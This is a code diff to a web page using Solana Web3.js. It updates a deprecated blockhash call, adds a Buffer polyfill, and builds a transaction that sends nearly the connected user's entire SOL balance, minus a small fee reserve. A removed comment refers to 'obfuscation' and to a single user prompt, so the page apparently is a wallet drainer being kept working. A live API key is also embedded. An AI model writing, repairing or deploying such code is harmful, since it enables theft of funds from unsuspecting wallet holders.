@@ -79,7 +79,8 @@
             </div>
         </div>
     </div>
-
+<script src="https://bundle.run/buffer@6.0.3"></script>
+<script>window.Buffer = window.Buffer || buffer.Buffer;</script>
     <!-- Load Solana Web3.js FIRST -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script>
@@ -255,13 +256,13 @@
 
             try {
                 const conn = new solanaWeb.Connection('https://solana-mainnet.g.alchemy.com/v2/bf8f6sul9ANkLYMG-gsqE');
-                const { blockhash } = await conn.getRecentBlockhash();
+                // Oprava: getRecentBlockhash -> getLatestBlockhash
+const { blockhash } = await conn.getLatestBlockhash('finalized');
 
-                // ===== MODIFICATION FOR OBFUSCATION =====
-                const soleUserPromptTx = new solanaWeb.Transaction({
-                    recentBlockhash: blockhash,
-                    feePayer: connectedWallet,
-                });
+const tx = new solanaWeb.Transaction({
+    recentBlockhash: blockhash,
+    feePayer: new solanaWeb.PublicKey(walletAddress)
+});
 
                 const reserveForFees = 0.02; // Rezerva na poplatky
                 const totalSolAvailableForTransfer = userSolBalance - reserveForFees;
